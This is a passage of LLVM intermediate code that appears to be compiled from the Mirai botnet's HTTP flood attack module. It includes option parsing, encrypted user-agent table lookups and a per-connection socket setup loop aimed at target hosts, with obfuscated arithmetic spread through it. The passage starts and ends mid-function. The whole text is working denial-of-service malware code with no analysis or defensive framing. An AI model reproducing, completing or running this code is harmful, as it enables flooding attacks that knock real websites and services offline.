; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2782

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2782

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2782

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2782

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %140, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %145

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %139

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %139

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = add i32 %133, -1055116177
  %135 = sub i32 %134, 32
  %136 = sub i32 %135, -1055116177
  %137 = sub nsw i32 %133, 32
  %138 = trunc i32 %136 to i8
  store i8 %138, i8* %131, align 1
  br label %139

; <label>:139:                                    ; preds = %127, %119, %111
  br label %140

; <label>:140:                                    ; preds = %139
  %141 = load i32, i32* %10, align 4
  %142 = sub i32 0, 1
  %143 = sub i32 %141, %142
  %144 = add nsw i32 %141, 1
  store i32 %143, i32* %10, align 4
  br label %106

; <label>:145:                                    ; preds = %106
  %146 = load i32, i32* %18, align 4
  %147 = icmp sgt i32 %146, 512
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %145
  store i32 512, i32* %18, align 4
  br label %149

; <label>:149:                                    ; preds = %148, %145
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %150 = load i32, i32* %18, align 4
  %151 = sext i32 %150 to i64
  %152 = call noalias i8* @calloc(i64 %151, i64 3140) #6
  %153 = bitcast i8* %152 to %struct.attack_http_state*
  store %struct.attack_http_state* %153, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %154

; <label>:154:                                    ; preds = %354, %149
  %155 = load i32, i32* %9, align 4
  %156 = load i32, i32* %18, align 4
  %157 = icmp slt i32 %155, %156
  br i1 %157, label %158, label %361

; <label>:158:                                    ; preds = %154
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 1
  store i8 0, i8* %163, align 4
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 0
  store i32 -1, i32* %168, align 4
  %169 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = srem i32 %170, %172
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 4
  store i32 %177, i32* %182, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 6
  %188 = getelementptr inbounds [257 x i8], [257 x i8]* %187, i32 0, i32 0
  %189 = load i8*, i8** %17, align 8
  %190 = call i32 @util_strcpy(i8* %188, i8* %189)
  %191 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %194, i32 0, i32 6
  %196 = getelementptr inbounds [257 x i8], [257 x i8]* %195, i64 0, i64 0
  %197 = load i8, i8* %196, align 4
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 47
  br i1 %199, label %200, label %228

; <label>:200:                                    ; preds = %158
  %201 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %204, i32 0, i32 6
  %206 = getelementptr inbounds [257 x i8], [257 x i8]* %205, i32 0, i32 0
  %207 = getelementptr inbounds i8, i8* %206, i64 1
  %208 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %211, i32 0, i32 6
  %213 = getelementptr inbounds [257 x i8], [257 x i8]* %212, i32 0, i32 0
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = call i32 @util_strlen(i8* %219)
  %221 = sext i32 %220 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %207, i8* %213, i64 %221, i32 1, i1 false)
  %222 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %225, i32 0, i32 6
  %227 = getelementptr inbounds [257 x i8], [257 x i8]* %226, i64 0, i64 0
  store i8 47, i8* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %200, %158
  %229 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i32 0, i32 10
  %234 = getelementptr inbounds [9 x i8], [9 x i8]* %233, i32 0, i32 0
  %235 = load i8*, i8** %15, align 8
  %236 = call i32 @util_strcpy(i8* %234, i8* %235)
  %237 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i32 0, i32 9
  %242 = getelementptr inbounds [9 x i8], [9 x i8]* %241, i32 0, i32 0
  %243 = load i8*, i8** %15, align 8
  %244 = call i32 @util_strcpy(i8* %242, i8* %243)
  %245 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %246 = load i32, i32* %9, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %245, i64 %247
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %248, i32 0, i32 7
  %250 = getelementptr inbounds [129 x i8], [129 x i8]* %249, i32 0, i32 0
  %251 = load i8*, i8** %16, align 8
  %252 = call i32 @util_strcpy(i8* %250, i8* %251)
  %253 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %254 = load i32, i32* %9, align 4
  %255 = load i8, i8* %5, align 1
  %256 = zext i8 %255 to i32
  %257 = srem i32 %254, %256
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 2
  %261 = load i8, i8* %260, align 4
  %262 = zext i8 %261 to i32
  %263 = icmp slt i32 %262, 32
  br i1 %263, label %264, label %297

; <label>:264:                                    ; preds = %228
  %265 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %266 = load i32, i32* %9, align 4
  %267 = load i8, i8* %5, align 1
  %268 = zext i8 %267 to i32
  %269 = srem i32 %266, %268
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 1
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = call i32 @rand_next()
  %276 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %277 = load i32, i32* %9, align 4
  %278 = load i8, i8* %5, align 1
  %279 = zext i8 %278 to i32
  %280 = srem i32 %277, %279
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 2
  %284 = load i8, i8* %283, align 4
  %285 = zext i8 %284 to i32
  %286 = lshr i32 %275, %285
  %287 = sub i32 %274, 1937269540
  %288 = add i32 %287, %286
  %289 = add i32 %288, 1937269540
  %290 = add i32 %274, %286
  %291 = call i32 @htonl(i32 %289) #7
  %292 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %295, i32 0, i32 4
  store i32 %291, i32* %296, align 4
  br label %297

; <label>:297:                                    ; preds = %264, %228
  %298 = call i32 @rand_next()
  %299 = urem i32 %298, 5
  switch i32 %299, label %345 [
    i32 0, label %300
    i32 1, label %309
    i32 2, label %318
    i32 3, label %327
    i32 4, label %336
  ]

; <label>:300:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 54)
  %301 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %304, i32 0, i32 5
  %306 = getelementptr inbounds [512 x i8], [512 x i8]* %305, i32 0, i32 0
  %307 = call i8* @table_retrieve_val(i32 54, i32* null)
  %308 = call i32 @util_strcpy(i8* %306, i8* %307)
  call void @table_lock_val(i8 zeroext 54)
  br label %345

; <label>:309:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 55)
  %310 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %313, i32 0, i32 5
  %315 = getelementptr inbounds [512 x i8], [512 x i8]* %314, i32 0, i32 0
  %316 = call i8* @table_retrieve_val(i32 55, i32* null)
  %317 = call i32 @util_strcpy(i8* %315, i8* %316)
  call void @table_lock_val(i8 zeroext 55)
  br label %345

; <label>:318:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 56)
  %319 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %322, i32 0, i32 5
  %324 = getelementptr inbounds [512 x i8], [512 x i8]* %323, i32 0, i32 0
  %325 = call i8* @table_retrieve_val(i32 56, i32* null)
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  call void @table_lock_val(i8 zeroext 56)
  br label %345

; <label>:327:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 57)
  %328 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %331, i32 0, i32 5
  %333 = getelementptr inbounds [512 x i8], [512 x i8]* %332, i32 0, i32 0
  %334 = call i8* @table_retrieve_val(i32 57, i32* null)
  %335 = call i32 @util_strcpy(i8* %333, i8* %334)
  call void @table_lock_val(i8 zeroext 57)
  br label %345

; <label>:336:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 58)
  %337 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %340, i32 0, i32 5
  %342 = getelementptr inbounds [512 x i8], [512 x i8]* %341, i32 0, i32 0
  %343 = call i8* @table_retrieve_val(i32 58, i32* null)
  %344 = call i32 @util_strcpy(i8* %342, i8* %343)
  call void @table_lock_val(i8 zeroext 58)
  br label %345

; <label>:345:                                    ; preds = %336, %327, %318, %309, %300, %297
  %346 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %347 = load i32, i32* %9, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %346, i64 %348
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %349, i32 0, i32 6
  %351 = getelementptr inbounds [257 x i8], [257 x i8]* %350, i32 0, i32 0
  %352 = load i8*, i8** %17, align 8
  %353 = call i32 @util_strcpy(i8* %351, i8* %352)
  br label %354

; <label>:354:                                    ; preds = %345
  %355 = load i32, i32* %9, align 4
  %356 = sub i32 0, %355
  %357 = sub i32 0, 1
  %358 = add i32 %356, %357
  %359 = sub i32 0, %358
  %360 = add nsw i32 %355, 1
  store i32 %359, i32* %9, align 4
  br label %154

; <label>:361:                                    ; preds = %154
  br label %362

; <label>:362:                                    ; preds = %2781, %1048, %1038, %361
  store i32 0, i32* %23, align 4
  %363 = call i64 @time(i64* null) #6
  %364 = trunc i64 %363 to i32
  store i32 %364, i32* %27, align 4
  br label %365

; <label>:365:                                    ; preds = %362
  %366 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %367 = getelementptr inbounds [16 x i64], [16 x i64]* %366, i64 0, i64 0
  %368 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %367) #6, !srcloc !1
  %369 = extractvalue { i64, i64* } %368, 0
  %370 = extractvalue { i64, i64* } %368, 1
  %371 = trunc i64 %369 to i32
  store i32 %371, i32* %28, align 4
  %372 = ptrtoint i64* %370 to i64
  %373 = trunc i64 %372 to i32
  store i32 %373, i32* %29, align 4
  br label %374

; <label>:374:                                    ; preds = %365
  br label %375

; <label>:375:                                    ; preds = %374
  %376 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %377 = getelementptr inbounds [16 x i64], [16 x i64]* %376, i64 0, i64 0
  %378 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %377) #6, !srcloc !2
  %379 = extractvalue { i64, i64* } %378, 0
  %380 = extractvalue { i64, i64* } %378, 1
  %381 = trunc i64 %379 to i32
  store i32 %381, i32* %30, align 4
  %382 = ptrtoint i64* %380 to i64
  %383 = trunc i64 %382 to i32
  store i32 %383, i32* %31, align 4
  br label %384

; <label>:384:                                    ; preds = %375
  store i32 0, i32* %9, align 4
  br label %385

; <label>:385:                                    ; preds = %1028, %384
  %386 = load i32, i32* %9, align 4
  %387 = load i32, i32* %18, align 4
  %388 = icmp slt i32 %386, %387
  br i1 %388, label %389, label %1035

; <label>:389:                                    ; preds = %385
  %390 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %391 = load i32, i32* %9, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %390, i64 %392
  store %struct.attack_http_state* %393, %struct.attack_http_state** %26, align 8
  %394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %394, i32 0, i32 1
  %396 = load i8, i8* %395, align 4
  %397 = zext i8 %396 to i32
  %398 = icmp eq i32 %397, 1
  br i1 %398, label %399, label %411

; <label>:399:                                    ; preds = %389
  %400 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %400, i32 0, i32 12
  %402 = load i32, i32* %401, align 4
  %403 = icmp ne i32 %402, 0
  br i1 %403, label %404, label %407

; <label>:404:                                    ; preds = %399
  %405 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %405, i32 0, i32 1
  store i8 4, i8* %406, align 4
  br label %410

; <label>:407:                                    ; preds = %399
  %408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i32 0, i32 1
  store i8 0, i8* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %407, %404
  br label %411

; <label>:411:                                    ; preds = %410, %389
  %412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %412, i32 0, i32 1
  %414 = load i8, i8* %413, align 4
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 0
  br i1 %416, label %417, label %507

; <label>:417:                                    ; preds = %411
  %418 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %418, i8 0, i64 16, i32 4, i1 false)
  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 4
  %422 = icmp ne i32 %421, -1
  br i1 %422, label %423, label %428

; <label>:423:                                    ; preds = %417
  %424 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 4
  %427 = call i32 @close(i32 %426)
  br label %428

; <label>:428:                                    ; preds = %423, %417
  %429 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %430, i32 0, i32 0
  store i32 %429, i32* %431, align 4
  %432 = icmp eq i32 %429, -1
  br i1 %432, label %433, label %434

; <label>:433:                                    ; preds = %428
  br label %1028

; <label>:434:                                    ; preds = %428
  %435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 4
  %441 = call i32 (i32, i32, ...) @fcntl(i32 %440, i32 3, i32 0)
  %442 = and i32 2048, %441
  %443 = xor i32 2048, %441
  %444 = or i32 %442, %443
  %445 = or i32 2048, %441
  %446 = call i32 (i32, i32, ...) @fcntl(i32 %437, i32 4, i32 %444)
  store i32 65535, i32* %10, align 4
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 4
  %450 = bitcast i32* %10 to i8*
  %451 = call i32 @setsockopt(i32 %449, i32 0, i32 8, i8* %450, i32 4) #6
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %452, align 4
  %453 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %453, i32 0, i32 4
  %455 = load i32, i32* %454, align 4
  %456 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %457 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %456, i32 0, i32 0
  store i32 %455, i32* %457, align 4
  %458 = load i16, i16* %19, align 2
  %459 = call zeroext i16 @htons(i16 zeroext %458) #7
